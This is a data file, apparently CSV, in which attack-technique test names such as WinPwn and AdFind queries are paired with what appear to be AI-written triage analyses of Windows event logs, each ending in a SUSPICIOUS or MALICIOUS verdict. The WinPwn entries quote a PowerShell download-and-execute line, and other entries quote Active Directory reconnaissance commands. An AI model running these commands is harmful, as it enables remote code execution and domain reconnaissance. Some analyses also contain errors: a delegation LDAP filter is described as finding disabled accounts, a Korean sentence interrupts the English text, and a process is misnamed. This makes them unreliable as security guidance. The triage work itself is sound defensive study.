4. **AdFind.exe Execution (Sysmon Log)**
   - We notice an execution of `AdFind.exe` via the command line `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe"" -sc exchaddresses`. 
   - AdFind is a legitimate tool used for querying Active Directory. However, its execution from a temporary directory context is a common practice for adversaries leveraging open-source tools to gather directory information.

5. **Microsoft Edge Update Activity (Sysmon Log)**
   - Regular updates and activities from Microsoft Edge Update processes are logged with appropriate versions and descriptions. All operations occur under the NT AUTHORITY\SYSTEM, with no anomalous changes noted.

### Assessment of Suspicious Activity:
- The use of `AdFind.exe` and the execution context (user `admin_test` and the temporary file path) raises a red flag. AdFind is not natively present on Windows systems and is frequently utilized by attackers in reconnaissance phases to gather information about Active Directory environments.
- Wevtutil usage by `admin_test` could be benign or indicate potential nefarious intent for log manipulation or system interactions.
- The observed activities don't conclusively demonstrate compromise, but certain elements warrant deeper investigation to rule out malicious intent.

### Resolution:
Based on the analysis above and considering the context of `AdFind.exe` execution, coupled with command-line tool usage by a seemingly administrative user, the log activities should not be immediately classified as benign nor outright malicious. Instead, they should be considered:

**Resolution: SUSPICIOUS**

### Recommended Actions:
- **Investigate AdFind Usage**: Investigate the purpose and context of AdFind execution, including the user's recent activities and access patterns.
- **Monitor Event Logs**: Continue monitoring for further execution of known administrative tools (e.g., PowerShell, wevtutil) and any discrepancies in event timing or sourcing.
- **Audit User Accounts**: Validate accounts, especially `admin_test`, for unusual behavior, recent logons, and any privilege alterations.
- **Threat Hunting**: Consider conducting a hunt to check for the presence of common post-exploitation frameworks or persistence mechanisms linked to adversarial group membership enumerations or privilege escalations. 

This activity may need follow-up with network monitoring and endpoint detection tools to further analyze potential lateral movement or data exfiltration attempts."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"Upon analyzing the provided Windows event logs, several findings and insights arise regarding the activities observed:

### 1. Sequence and Process Observations:
- **Processes Executed**: There are multiple instances of known Windows system utilities being executed, such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`.
- **Windows Event Utility Executions**: The repeated execution of `wevtutil.exe` at very close intervals, often accompanied by `conhost.exe`, could indicate log querying or clearing. However, there's no evidence suggesting log clearance explicitly.
- **PowerShell Activity**: A PowerShell instance was executed with the script parameter, querying environment details with `""{script $env:computername -Properties *}""`. PowerShell usage, especially with scripts, can be an indicator of administrative tasks or automation but could also raise concerns depending on the context and user.
- **Service and Process Activity**: Regular Edge updates and related processes like `MicrosoftEdgeUpdate.exe` are observed. These are common and expected for systems having Microsoft Edge installed, showing normal application maintenance behavior.

### 2. User and Privilege Context:
- The user context for most process activities appears as `SERVER002\\admin_test`, which indicates administrative-level actions.
- Processes are running at a high integrity level, consistent with administrative privileges and access control.

### 3. Potential Indicators of Concern:
- **Frequency and Timing**: While each individual execution of tools like `wevtutil.exe` or `hostname.exe` could be benign administrative actions, the frequency and rapid succession of executions suggest automated or scripted activity.
- **Purpose and Intent of PowerShell Command**: The exact script being executed with PowerShell (`script $env:computername -Properties *`) lacks clarity in intention and potential output, which could warrant further scrutiny.

### Assessment of Intent:
Given the rapid succession of these event logs and the tools used, there is a suggestion of scripted or automated setups being used, possibly for system auditing, testing, or routine checks. However, without more context—for instance, knowing if this aligns with scheduled maintenance or specific SysAdmin tasks—establishing intent purely as benign becomes challenging.

### Conclusion and Resolution:
- **Resolution**: **SUSPICIOUS**  
While there are no explicit signs of malicious compromise like unexpected foreign software execution or privilege escalations, the nature and timing of events do not fit typical operational patterns without an explicit explanation of these under administrative procedures or automation. The activities bear potential risks if not correctly contextualized, hence suggesting further examination to determine whether they align with legitimate tasks or pose any security risks.

### Recommended Next Steps:
1. **Further Investigation**: Review any automation scripts or maintenance tasks scheduled for the time of these logs to verify intent.
2. **Monitoring**: Implement enhanced monitoring for activities involving the admin_test account and closely watch for unauthorized PowerShell activities or critical utility executions.
3. **Context Verification**: Confirm with the administrative and IT teams whether such activities were planned, and assess logging and monitoring policies to ensure all actions are accounted for and documented."
Suspicious LAPS Attributes Query with adfind all properties,"### Analysis of Windows Event Logs

Upon analysis of the provided Windows event logs, several points of interest have been identified.

#### Potentially Suspicious Activity

1. **Process Creation and Execution**:
    - Multiple instances of the `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` processes executed in quick succession. These processes are native Windows utilities, but their simultaneous and repetitive execution might reflect scripted or automated activity, potentially associated with log manipulation or enumeration.
   
2. **PowerShell Activity**:
    - PowerShell was used to execute `AdFind.exe` from a directory under a temporary location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe`). `AdFind.exe` is a legitimate tool for querying Active Directory, but when used inappropriately, it can signal reconnaissance activity common in lateral movement or enumeration by threat actors.

3. **Command Line and Parent Process Concerns**:
    - The execution of `PowerShell.exe` with command line arguments related to `AdFind.exe`, coming from the parent process `wsmprovhost.exe` (associated with Windows Remote Management), raises concerns about remote attempts to gather information about the domain.

#### Normal and Harmless Activity

4. **Time Synchronization**:
    - The changes in system time and the corresponding events in the Security and System logs appear consistent with routine time synchronization over NTP (`time.windows.com`), a normal and expected activity.

5. **Common System Processes**:
    - Frequent executions of `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` with NT AUTHORITY\SYSTEM or NETWORK SERVICE accounts represent normal activity for system services and management.

6. **Microsoft Edge Update**:
    - The activity associated with `MicrosoftEdgeUpdate.exe` appears to be a regular service execution process triggered by the system as part of its normal modernization and update checks.

### Threat Assessment

**Threat Risks**:
- The use of `PowerShell` with `AdFind.exe` in a potentially obfuscated manner poses a significant risk. Such activity is often used for gathering sensitive data about the network environment covertly.
- Although the logs do not provide explicit evidence of data exfiltration or privilege escalation, the context and method imply possible reconnaissance activity.

### Conclusion and Recommendations

Given the indicators present in the logs, **the resolution should be categorized as SUSPICIOUS**. The activity surrounding the use of `PowerShell` and `AdFind.exe`, coupled with the unusual pattern of native utility execution, warrant further investigation. 

**Guidance on How to Proceed**:
- Conduct a full audit of recent user activities, especially focusing on the `SERVER002\admin_test` account.
- Analyze network traffic for signs of lateral movement or data collection attempts, especially around the times these events were logged.
- Review system policies and configurations to determine if unauthorized tools or scripts are being transferred or executed externally.
- Consider isolating the affected system until a comprehensive understanding of the actions performed using `AdFind.exe` is established.
- Cross-reference the event logs with other security tools and solutions in place, such as endpoint protection logs, to see if they corroborate significant alerts or anomalies.
- If confirmed suspicious or malicious activity, follow the organization's incident response plan to contain and remediate the potential compromise."
Enumerate Active Directory for Unconstrained Delegation,"Based on the analysis of the provided Windows event logs, here is a detailed examination of potential indicators of malicious activity:

### Analysis of PowerShell Logs:
1. **PowerShell Command Execution**: 
   - The PowerShell command executed is: `Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain`.
   - This command is typically used to query active directory objects to find accounts whose properties may indicate they are disabled, as indicated by the LDAP filter.
   - While this command is not inherently malicious, it is unusual for standard administrative operations when focused on querying a specific property bit. It could potentially be used for reconnaissance by someone with inappropriate access.
   
### Analysis of Sysmon Logs:
1. **Process Creation Events**: 
   - Windows PowerShell (`powershell.exe`) was executed by the user `SERVER002\admin_test`, as observed in multiple instances.
   - `conhost.exe` was also executed, typically this is a normal process but could be used suspiciously to obfuscate actions.
   - Multiple launches of `MicrosoftEdgeUpdate.exe` and associated Microsoft products were seen under the `NT AUTHORITY\SYSTEM` account, which is normal for automated update tasks.
   - The use of `whoami.exe` and `hostname.exe` could indicate an attempt to gather system information, which might be part of normal activities or initial reconnaissance steps by an attacker.

### Analysis of Application Logs:
1. **Software Protection Platform Service**:
   - Normal entries related to software licensing and protection, no suspicious entries observed.
   
2. **Edge Update**:
   - Service stopped and several updates occurred which is typical behavior for Edge update management.
   
### Conclusion:
The logs show behavior indicative of possibly suspicious activity, particularly regarding the PowerShell commands executed to query Active Directory. However, there is not enough explicit evidence to classify this activity as definitely malicious without further context or additional information such as user intent, frequency of such queries, or known issues with user `admin_test`.

**Resolution**: **SUSPICIOUS**

### Recommendations to Proceed:
1. **Audit the User Activities**: Review the account `admin_test` for any unusual or unauthorized activity or access patterns. Ensure that this user is performing tasks in accordance with their role.
2. **Check Active Directory Access**: Verify logs related to Active Directory to see if there are additional queries or actions being performed that are not expected.
3. **Monitoring and Alerts**: Set up alerts for similar PowerShell activities, especially those involving AD queries, to flag potential reconnaissance activities.
4. **Evaluate Patch Management Logs**: Confirm that software updates are genuine and correlate with regular patch management schedules.
5. **Perform a Threat Hunt**: Conduct a deeper forensic investigation to seek other indicators of compromise not visible in the current logs.

It's essential to perform a more comprehensive analysis involving network traffic logs, historical log data for anomaly detection, and potentially, a review of the overall security architecture."
Discover System Language by Windows API Query,"After reviewing the provided logs from various log channels, I have found the following points worth noting that could indicate potentially suspicious or malicious activity:

1. **Security Log** Analysis:
   - The logs show multiple successful logon events (EventID 4624) by the SYSTEM account on the Server002 machine. The logon type is 5, which indicates a service logon. While these are expected for system services, monitoring these for anomalies is wise, especially when correlating them with other event types.
   - EventID 4672, which tracks special privileges assigned to a new logon, appears frequently. Many high-level privileges were granted, implying that privileged operations are being performed. This may not be unusual for SYSTEM activities but should be correlated with actions performed.
   - EventID 5379, indicating failed attempts to read credentials using Microsoft Account and Windows Live, repeated multiple times. The failure return code `3221226021` suggests these attempts by process `5228` (likely wevtutil or similar) didn't succeed, but such behavior might indicate an issue or probing activity worth further review.
   - EventID 4798 indicates enumerating accounts (listing user accounts) from processes like `taskhostw.exe`, which might be routine but combined with other activities could suggest information gathering.

2. **Sysmon Log** Analysis:
   - Sysmon EventID 1 for process creation shows the execution of `LanguageKeyboardLayout.exe` from a temp directory via `cmd.exe`. The use of a temporary directory and execution through command line could be suspicious depending on the context of this executable. It should be checked if this executable is a known legitimate file.
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by a user `SERVER002\admin_test`. Frequently using `wevtutil.exe` could suggest attempts to query or delete event logs. This should be investigated to determine if they align with expected administrative activities.
   - The command line execution involving altering Windows configuration or files in unorthodox ways often spans unauthorized or suspicious activity.

3. **Overall Suspicion**:
   - The execution patterns, especially surrounding `admin_test` activities and utilizing known utilities that could be used to tamper with logs (`wevtutil`), point to potentially suspicious behavior.
   - Repeated failures to access Microsoft accounts and enumerate Windows Live services may indicate attempts to test credentials or services possibly tied to penetration testing, misconfiguration, or adversarial exploration.

**Conclusion and Recommendation**:
- Resolution: **SUSPICIOUS**
- The logs are indicative of suspicious behavior that does not yet conclusively confirm malicious activity but certainly warrants further investigation. It is recommended to:
  - Validate the legitimacy and necessity of running the `LanguageKeyboardLayout.exe` from a temporary path; consider hash verification with known signatures.
  - Assess `admin_test` user activities to ensure all actions align with expected administrative functions.
  - Correlate event timelines with known legitimate activities or investigate these correlations manually to confirm actions are harmless.
  - Enhance monitoring around these types of activities and consider using threat detection tools to detect potential persistence mechanisms or lateral movement attempts.

These steps can help determine if the ongoing behavior reflects a breach attempt or validates current operational needs."
Detect a Debugger Presence in the Machine,"Upon analyzing the provided Windows event logs, several observations emerge:

### System Logs
- **Time Change Events:** Multiple events indicate the system time was changed. The changes show an unusually small time adjustment, which is frequent in typical log entries related to time synchronization services (e.g., w32time). 

### PowerShell Logs
- **PowerShell Execution:** 로그 항목은 PowerShell 실행의 일반적인 특성을 보여줍니다. 로그 엔트리에는 특정한 악의적인 행동이 포함되어 있지 않습니다.

### Security Logs
- **Privilege Elevation:** An ""admin_test"" account has logged on and holds a wide range of privileges, such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, etc. These are often necessary for administrative tasks but could be exploited if the account were compromised.
- **Logon Event (4624):** This event corresponds to a network logon using NTLM. While not inherently suspicious, NTLM authentication can be associated with pass-the-hash attacks if observed anomalously. However, no unusual 'Source Network Address' or deviation from expected NTLM usage patterns is discerned.

### Sysmon Logs
- **Process Execution (Sysmon Event ID 1 and 5):** 
  - Repeated `MicrosoftEdgeUpdate.exe` processes appear, which suggest typical activity related to Microsoft Edge updates.
  - Execution of commands like `whoami.exe` and `hostname.exe` by `admin_test` suggest user context enumeration. While often part of legitimate administrative tasks, if out-of-context, this could be associated with reconnaissance phases of an attack.
  
### Application Logs
- **Software Protection Platform Service:** Routine log entries related to system services starting and stopping without indicating unusual behavior.

### Conclusion
The log data presents primarily benign activities, such as routine system and application operations. However, the entitlements of the ""admin_test"" account and its involvement in context enumeration (e.g., executing ""whoami.exe"") stand out. While a legitimate administrator might perform such actions, if ""admin_test"" is not a recognized or expected account, this warrants further scrutiny.

### Assessment
- **Resolution:** SUSPICIOUS
- **Rationale:** While there is no definitive indication of malware or unauthorized access within these logs, the activities of ""admin_test"" involve high privilege use that can be concerning if this account is unknown or expected not to perform these actions. 

### Recommended Next Steps
1. **Verify the Legitimacy of the ""admin_test"" Account:** Ensure that this account is known and verify any corresponding activity with the assigned user.
2. **Monitor Privileged Actions:** Continue to monitor the execution of processes by high-privilege accounts.
3. **Network Activity Review:** Check for unusual outbound connections or attempts at lateral movement from this host.
4. **Audit and Review:** Check for anomalies in authentication logs for times and IP addresses that look unusual for the typical access pattern."
User Discovery With Env Vars PowerShell Script,"## Analysis of Logs

### Security Log Analysis

- **Repeated Event ID 5379**: This Event ID indicates Credential Manager attempts to retrieve credentials. All instances show `ReturnCode: 3221226021`, which translates to `STATUS_CANNOT_IMPERSONATE`. This suggests that the operation did not successfully impersonate the target logon session. While more successful attempts could indicate malicious activity, these failures do not inherently prove malicious behavior. The repetition, however, might merit further exploration depending on context.

### Application Log Analysis

- **Windows Defender Status**: The `EventID 15` log states ""Windows Defender, SECURITY_PRODUCT_STATE_ON,"" indicating that Windows Defender is operational. There are no indications of deactivation or tampering, which is a positive sign of AV presence.

### System Log Analysis

- **Security Intelligence Update**: Events `43, 44, and 19` from the Windows Update Client indicate updates for Microsoft Defender Antivirus. There is nothing unusual here as it confirms antivirus signatures are being updated, which is expected behavior.

- **Kernel-General Size Reduction**: EventID `15` indicates a reduction in the size of the registry hive `COMPONENTS`, which could be routine or associated with a cleanup process. Absent further context, there is no apparent link to malicious activity.

### Sysmon Log Analysis

- **PowerShell Execution**: The command included creating a text file of the username using PowerShell:
  - This use of PowerShell could hint at scripting activity or automation but isn't explicitly malicious by itself. Scripting to output the logged-on user to a file could be legitimate for audit or automation purposes but also could be used for reconnaissance.

- **whoami and HOSTNAME Executions**: These processes are used to identify the system and user context. Their frequent invocation could suggest information gathering, especially if automated.

- **wevtutil Execution**: Multiple instances of `wevtutil.exe` indicate potential log export or clearing activity. Without specific arguments shown (e.g., clearing logs), this is anomalous rather than definitively malicious. 

### Windows PowerShell Log Analysis

- **PowerShell Session and Execution**: Specific EventIDs (`600`) show the starting of a PowerShell session with syntax aligned with retrieving user environment information. While this might be used in both administrative and malicious scripts, the lack of further context or known purpose leaves its correctness indeterminate.

## Conclusion

Based on the provided event log entries:

- **Indications of Automation/Reconnaissance**: The repeated execution of system information and credential manager access commands could indicate automated scripts or probing. PowerShell activity is often a hallmark of scripting automation.

- **No Clear Indicators of Compromise**: There are no direct indicators (e.g., known exploit commands, foreign IP connections) definitively marking these logs as malicious. However, the manner and combination of operations could suggest suspicious behavior.

### Resolution
- **Resolution: SUSPICIOUS**

Given the context provided, these activities do not confirm a compromise but suggest the need for further investigation. Specifically, understanding the role of the `admin_test` account, reviewing associated task scheduling, and correlating with any unusual user or system activity might clarify intent. Consider examining endpoint protection logs, network activity, and system behavior for a comprehensive view."
File and Directory Discovery (PowerShell),"Upon analyzing the provided Windows event logs, several observations can be made. Let's break down the key findings from the logs:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**: 
   - There are multiple occurrences of `wevtutil.exe` and `conhost.exe` being executed by a user `SERVER002\\admin_test`. This could indicate that logs are being queried or manipulated. The use of `wevtutil.exe` for legitimate purposes would typically be associated with administrative or troubleshooting activities.
   
2. **PowerShell Activity**:
   - The logs reveal an instance of PowerShell running with a command that includes listing directory contents recursively (`ls -recurse`, `get-childitem -recurse`, `gci -recurse`). This could be indicative of legitimate administrative scripting or an attempt to gather information from the system.
   - The execution of PowerShell by the user `SERVER002\\admin_test` from an elevated integrity level (High) can either be routine for an admin account or suspicious if not expected.
   
3. **Use of `whoami.exe` and `HOSTNAME.EXE`**:
   - The use of `whoami.exe` indicates someone is checking the logged-in user information which could be standard or part of post-exploitation activity to validate access.
   - The `HOSTNAME.EXE` execution is generally benign unless correlated with malicious behavior intended to cloak other activities.
   
4. **Time Change Events**:
   - There are entries suggesting a change in system time executed by a service running as `LOCAL SERVICE` and `svchost.exe`. This could indicate a legitimate time synchronization activity or potentially an effort to obscure log timing.

5. **Windows Scripting Host (`wsmprovhost.exe`) Usage**:
   - The presence of `wsmprovhost.exe` as a parent process for some entries suggests Windows Remote Management activities, which can be legitimate but should be verified against expected patterns and usage.

6. **System and Security Logs 4616 Events**:
   - Indicates time was changed, potentially resetting the clock or synchronizing to a NTP server. This might be a routine operation unless frequently occurring or during unplanned maintenance windows.

### Assessment:

**Resolution: SUSPICIOUS**

While many of the activities such as PowerShell executions, the use of `wevtutil.exe`, and the invocation of `whoami.exe` can be associated with legitimate administrative actions, any unusual or unexplained use by a regular user account or unexpected service account can be indicative of potentially malicious activities. The pattern and the timing of these events suggest further examination is warranted. The time change entries are atypical, notably if they occur outside of expected operational procedures.

### Guidance:

1. **Verification of User Activity**: Validate `SERVER002\\admin_test` usage patterns. Confirm these actions align with expected administrative tasks.
2. **Check for Known Threats**: Evaluate if there are any known tactics leveraging tools such as PowerShell and `wevtutil.exe` for data exfiltration or persistence.
3. **Review Time Change Logs**: Correlate time changes with maintenance schedules or administrative tasks.
4. **Conduct a Threat Hunt**: Inspect other systems for similar activities, especially in regards to other sign-ins or activities by `SERVER002\\admin_test`.
5. **Consider Implementing Enhanced Logging and Alerting**: Ensure more granular auditing on PowerShell and critical system changes.

Ultimately, suspicious activities like those identified should be investigated thoroughly, with appropriate actions taken based on organizational security policies and risk assessments."
Elevated group enumeration using net group (Domain),"### Detailed Analysis of Windows Event Logs

#### 1. Overview of the Events
The provided logs primarily originate from Sysmon events and include a selection of Security and Application logs. The task is to identify any malicious or suspicious activities within the entries provided.

#### 2. Suspicious or Anomalous Behavior

- **Process Executions**: 
  - Multiple executions of the `MicrosoftEdgeUpdate.exe` and related processes like `MicrosoftEdgeUpdateComRegisterShell64.exe`. These are typical for Edge updates, but frequent execution in quick succession may warrant further inspection to ensure legitimacy.
  - Execution of `whoami.exe` and `hostname.exe` by the user `admin_test`. These tools are often used during reconnaissance activities to ascertain the environment and user's identity, which could be normal administrative actions, but also an indication of an investigation by a user probing for privilege contexts.
  - Several instances of `net.exe` and `net1.exe` are observed querying group memberships of high-privilege groups such as ""Domain Admins"" and ""Exchange Organization Management"". This is an atypical administrative activity if not part of known administrative audits and could represent privilege reconnaissance.
  
- **Elevated Privileges**:
  - The user `admin_test` has been granted several high-level privileges (EventID 4672) such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and others which facilitate significant control over the system. This is suspicious if not part of regular administrative tasks.

- **Cmd.exe Invocation**:
  - There is an event where `cmd.exe` is used to check membership of critical security groups (EventID 18003). This execution could be seen in a legitimate administrative context but more frequently aligns with activities during a compromise where a user is assessing privilege escalation success. 

- **System and Network Information Gathering**:
  - Execution of command-line utilities such as `whoami`, `hostname`, and network-related commands (`net` and `net1`) indicative of attempts to understand system and user contexts.

#### 3. Assessment of Malicious Activity

Upon review, the log entries suggest reconnaissance activities consistent with a user attempting to verify administrative privileges and subsequent actions by checking membership in high-level groups through the `net` command. The frequent and abrupt nature of these queries and processes point towards potential malicious behavior.

#### 4. Identified Threats and Risks

- **Reconnaissance Activities**: Multiple system and user discovery commands executed which might suggest recon operations typical in the early stages of compromise.
  
- **Privilege Escalation and Usage**: `admin_test` is performing activities that align with leveraging and testing privileged access.

#### 5. Guidance on How to Proceed

- **Immediate Actions**: 
  - Review audit logs and command history for the user `admin_test`.
  - Confirm whether these activities were part of scheduled updates or administrative audits.
  - Corroborate with other logs for any anomalous network or system activities.

- **Long-Term Mitigation**: 
  - Implement stricter monitoring on accounts with elevated privileges.
  - Ensure that any use of `net`, `whoami`, and similar utilities are regularly audited and justified within administrative logs.

#### Conclusion
Given the observed events that align strongly with reconnaissance and privilege escalation activities, these logs indicate potential malicious activities.

### Resolution: MALICIOUS

The combination of high-frequency administrative command usage, system/user reconnaissance, and direct querying of security-sensitive group memberships collectively point towards probable malicious intent. Immediate investigation and response are recommended to mitigate potential risks."
WinPwn - powerSQL,"Upon careful analysis of the provided event logs from the Windows host, several findings point towards potentially malicious activity. Here is a detailed breakdown:

1. **Suspicious PowerShell Activity:**
   - The Sysmon logs and PowerShell logs show execution of PowerShell with a command line that downloads and executes a script from a URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This behavior is commonly associated with script-based attacks, where attackers use PowerShell to download and execute payloads from external sources.

2. **Execution of Known Attack Patterns:**
   - The specific pattern observed (downloading and executing a script via PowerShell) matches known attack vectors often used in exploitation frameworks. The use of `Invoke-Expression` (`iex`) with `net.webclient` is a red flag as it is often used in malicious scripts to execute code fetched from URLs.

3. **Elevated Privilege Activity:**
   - Multiple events in the security logs indicate the use of high privileges. For example, there are repeated instances of Event ID 4672 (which shows special privileges being assigned). While this may not be directly malicious, in conjunction with the suspicious PowerShell execution, it may suggest misuse of privileges.

4. **Task Host Process Activity:**
   - The presence of multiple `taskhostw.exe` events (associated with system task operations) in connection with user inquiries may indicate adversaries attempting to list or manage tasks, which can be steps in persisting or executing payloads stealthily.

5. **General Observations:**
   - There is a significant number of process creations related to Microsoft Edge Update, which, in isolation, could be normal. However, when combined with the PowerShell activity, it suggests a deeper inspection is warranted to determine the nature of these activities.

6. **Logs from Security-Related Services:**
   - Repeated logging entries indicating context changes in Windows Defender, while generally benign, suggest a heightened activity level in security services on the system.

### Conclusion

With the information provided in the logs, there is substantial evidence pointing towards potentially malicious behavior, particularly the execution of PowerShell commands to download and execute scripts from external sources, indicating possible compromise or attempted exploitation.

### Resolution: MALICIOUS

**Guidance on Proceeding:**
- Immediately isolate the affected host from the network to prevent further potential spread of any malicious activity.
- Conduct a thorough forensic investigation to determine the full extent and impact of the compromise.
- Review firewall and network logs for anomalies around the timestamp of these events for potential lateral movement or exfiltration.
- Check for additional indicators of compromise on other systems.
- Ensure that real-time protection and security updates are fully in place and operational.
- Consider engaging with a cybersecurity response team for an in-depth threat assessment and assistance in remediation.
"
System Owner-User Discovery,"**Analysis of Event Logs:**

1. **Security Logs (Event ID 4798 & 5379):**
   - Event ID 4798 signifies that a user has enumerated the local group memberships on the host. The enumeration was done by the user ""admin_test.""
   - The processes involved (`WmiPrvSE.exe`) are legitimate Windows processes; however, group enumeration may be linked to reconnaissance activities during an intrusion, especially if performed frequently or without a clear, legitimate purpose.
   - Event ID 5379 indicates attempts to retrieve credentials with return code ""3221226021,"" suggesting an error or potential misconfiguration. This constant return code and attempts to access credential storage could indicate unsuccessful attempts to access credential information.

2. **Application Logs:**
   - Windows Defender is running and in the `SECURITY_PRODUCT_STATE_ON` state, indicating antivirus protection is active.

3. **Sysmon Logs:**
   - There are several logs showing the execution of standard Windows binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `wmic.exe`. These could be used either legitimately or suspiciously for enumeration and system interaction.
   - Of particular interest is the command line from a `cmd.exe` process that suggests enumeration of user accounts (`whoami`, `wmic useraccount get /ALL`, `quser`, and session details with `qwinsta`), which could be interpreted as problematic recon activity, though not malicious on its face if the user was performing legitimate administrative tasks.
   - Processes such as `wuauclt.exe` and `AM_Delta.exe`, associated with Windows Update and anti-malware updates, appear benign and indicative only of routine system maintenance activity.

4. **System Logs:**
   - Windows Update logs show successful updates to the Security Intelligence Update for Microsoft Defender Antivirus. This supports the Application log information that antivirus definitions are kept up to date.

**Assessment:**

- **Suspicious Activity**: The pattern of behavior in the security logs (group enumeration) alongside specific command-line usage (found in Sysmon logs)—especially processes related to user account and session enumeration—suggest potential reconnaissance activity. The enumeration actions might be benign if tied to a legitimate task, but under continuous reconnaissance scenarios, it could indicate suspicious activity.
  
- **Potential Recon Patterns**: The repetitive nature of these attempts and the specifics of the `cmd.exe` command lines for querying user information and sessions raise concerns about recon operations, which can precede more malicious actions.

**Resolution:**
- **SUSPICIOUS**: The logs indicate potentially suspicious activity that could warrant further investigation, particularly to determine if the behavior is linked to legitimate administrative actions or if it represents the initial stages of malicious reconnaissance by an unauthorized user.

**Guidance on How to Proceed:**
1. **Review User Activity**: Confirm with the owner of the ""admin_test"" account whether these actions were intended and part of a legitimate task.
2. **Increase Monitoring**: Implement additional monitoring to capture further events associated with `admin_test` to determine regular patterns versus anomalies.
3. **Authenticate Processes**: Validate whether any unauthorized or unusual software was installed that could facilitate illicit enumeration or credential attempts.
4. **Potential Forensics**: Consider conducting a deeper forensic analysis to ensure no persistent threats have been established on the host."
WinPwn - GPORemoteAccessPolicy,"Upon analyzing the provided event logs from the Windows machine, I can identify several indicators of activity that warrant further investigation. Here's a breakdown of suspicious behavior observed:

### Windows PowerShell Logs
1. **PowerShell Script Execution**: The logs show multiple PowerShell events where a script is executed using `iex(new-object net.webclient).downloadstring(...)`. This is a common technique used in malicious activities to execute scripts from the internet and could potentially indicate malicious intent.
   - The script is fetched from `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`. This does not confirm malicious activity outright, but it is suspicious because it uses a popular method for downloading and executing potentially harmful scripts from the web.

### Security Logs
1. **Privilege Escalation**: There are several Security logs indicating high privilege activities (4672 events) by the user `admin_test`, with privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. Such privileges are often associated with administrative or critical system-level actions, which, if unexpected, could be indicative of a compromised account or privilege escalation attempt.

2. **Frequent Logon and Logoff**: There are multiple logon (4624) and logoff (4634) events for the user `admin_test` that happen in quick succession. The use of NTLM authentication from an IPv6 address (`fe80::e3b5:5371:12a8:9c77`) suggests potential external or unauthorized access, which could be suspicious.

### System Logs
1. **Time Change**: The system logs indicate that the system time was changed (EventID 1 and 24). Changing system time can be a tactic used by attackers to manipulate log timestamps, potentially to hide or alter the sequence of events.

### Sysmon Logs
1. **Process Activity**: The `wevtutil.exe` and `conhost.exe` processes are seen multiple times in the Sysmon logs. Without further context, these command-line utilities can be used for legitimate system administrative actions, but they can also play roles in log tampering or obfuscating malicious activity. Multiple executions in a short period should be investigated further.

2. **'Unknown Process'**: An unknown process is seen executing in the Sysmon logs, which is concerning and should be further scrutinized to determine its origin and purpose.

### Assessment
- **Threat/Risks Identified**: The evidence collected suggests potential malicious activity due to:
  - Use of PowerShell to execute scripts from untrusted remote locations.
  - High privilege operations by `admin_test` that might indicate privilege escalation.
  - Unexpected time changes and quick succession logon events.

### Resolution
Based on the analysis of the logs, this activity should be classified as:

**SUSPICIOUS** - The observed activities, while not definitively malicious, warrant further investigation to confirm the intent of the actions. It is advisable to:
- Check the nature and source of the PowerShell script.
- Review the intention behind privilege escalations for the `admin_test` account.
- Investigate the unusual time change activities and sudden logon/logoff behavior by checking network traffic or other related logs for correlation.
- Conduct a comprehensive review of the system's security posture and user activities to determine the legitimacy of these actions.

**Guidance on how to proceed**:
1. Isolate the affected system to prevent potential spread or external communication.
2. Perform a detailed review of the script hosted on GitHub to ascertain if it is indeed malicious.
3. Ensure regular monitoring and alerting are set up for such activities in the future.
4. Consider involving the incident response team to conduct a deeper forensic analysis if needed."
Enumerate Active Directory Users with ADSISearcher,"### Analysis of Windows Event Logs:

1. **PowerShell Logs:**
   - Observed multiple PowerShell events with the host application specified as `powershell.exe & {([script]""objectcategory=user"").FindAll(); ([script]""objectcategory=user"").FindOne()}`.
   - Execution of PowerShell scripts that involve querying object categories like users in Active Directory contexts can be indicative of reconnaissance activity, especially if there is no legitimate need.
   - Frequency and timing of PowerShell executions are closely packed, which might raise concerns depending on the usage context.

2. **Application Logs:**
   - Windows Defender is reported to be active, as indicated by the ""SECURITY_PRODUCT_STATE_ON"" message, which is a positive sign for host security.
   - Multiple logs indicate ""Service stopped"" for 'edgeupdate'. There is a possibility that updates or installations are occurring legitimately. However, stopping services atypically might allow a process interruption, suggesting further inspection may be needed if suspicious behavior correlates.

3. **System Logs:**
   - Security Intelligence Update logs indicate that Microsoft Defender updates have been applied, which suggests the system's defenses are being kept up-to-date.
   - Time change events suggest regular synchronization with a time server, `time.windows.com`, which is expected behavior for system timekeeping.

4. **Sysmon Logs:**
   - Numerous entries log typical system processes like `wevtutil.exe`, `conhost.exe`, and `svchost.exe` with high frequency. While these are normal system processes, the `SERVER002\\admin_test` user is executing various processes like `C:\\Windows\\System32\\hostname.exe`, `whoami.exe`, and invoking `powershell.exe`.
   - No direct indication of malicious execution other than potential misuse of `powershell.exe` for reconnaissance as previously observed.

5. **Security Logs:**
   - Time changes and system process monitoring align with expected Windows activities surrounding process management and system timekeeping procedures.

### Assessment:
- **Indicators of Suspicion**: Powershell scripts executed for querying users and AD categories without a clear legitimate business or operational justification. Multiple PowerShell instances with similar commands can be suspicious unless verified for authorized administrative tasks.
- **Normal Activities**: Most entries such as system updates, Windows Defender updates, and time synchronization using NTP server, align with expected behavior.

### Conclusion:
Based on the logs examined, the recurring PowerShell activity is a potential indicator of suspicious behavior, especially if not linked to legitimate administrative processes or scheduled tasks.

**Resolution**: **SUSPICIOUS**
- **Action Required**: Conduct a deeper investigation into the purpose of the PowerShell commands executed and verify if these align with legitimate administrative activities or processes. Check for any unauthorized access or tasks scheduled that might have led to these executions. If necessary, enhance monitoring and review user activities surrounding this event timeframe."
